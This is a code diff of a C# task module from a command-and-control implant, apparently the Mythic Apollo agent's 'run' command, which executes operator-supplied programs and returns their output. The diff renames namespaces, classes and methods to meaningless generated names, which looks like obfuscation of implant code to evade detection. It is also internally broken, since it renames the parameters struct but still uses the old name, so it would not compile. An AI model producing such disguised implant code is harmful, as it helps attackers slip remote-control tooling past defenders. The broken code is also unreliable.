@@ -6,11 +6,11 @@
 
 #if RUN
 
-using ApolloInterop.Classes;
-using ApolloInterop.Classes.Api;
-using ApolloInterop.Classes.Core;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Classes.Api;
+using PhantomInterop.Classes.Core;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using System;
 using System.Runtime.InteropServices;
 using System.Runtime.Serialization;
@@ -18,10 +18,10 @@ using System.Threading;
 
 namespace Tasks
 {
-    public class run : Tasking
+    public class RobustRouter550B : Tasking
     {
         [DataContract]
-        internal struct RunParameters
+        internal struct IntelligentValidatorF9F8
         {
             [DataMember(Name = "executable")] public string Executable;
             [DataMember(Name = "arguments")] public string Arguments;
@@ -45,7 +45,7 @@ namespace Tasks
         public override void Start()
         {
             Process proc = null;
-            if (string.IsNullOrEmpty(_data.Parameters))
+            if (ValidationHelper.IsStringEmpty(_data.Parameters))
             {
                 _agent.GetTaskManager().AddTaskResponseToQueue(
                     CreateTaskResponse(
@@ -55,7 +55,7 @@ namespace Tasks
             {
                 RunParameters parameters = _jsonSerializer.Deserialize<RunParameters>(_data.Parameters);
                 string mythiccmd = parameters.Executable;
-                if (!string.IsNullOrEmpty(parameters.Arguments))
+                if (!ValidationHelper.IsStringEmpty(parameters.Arguments))
                 {
                     mythiccmd += " " + parameters.Arguments;
                 }
@@ -122,16 +122,16 @@ namespace Tasks
             }
         }
 
-        private void Proc_Exit(object sender, EventArgs e)
+        private void RobustProcessor2BE6(object sender, EventArgs e)
         {
             _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                 "", true));
             _complete.Set();
         }
 
-        private void DataReceived(object sender, ApolloInterop.Classes.Events.StringDataEventArgs e)
+        private void IntelligentController34E6(object sender, PhantomInterop.Classes.Events.StringDataEventArgs e)
         {
-            if (!string.IsNullOrEmpty(e.Data))
+            if (!ValidationHelper.IsStringEmpty(e.Data))
             {
                 _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                     e.Data,
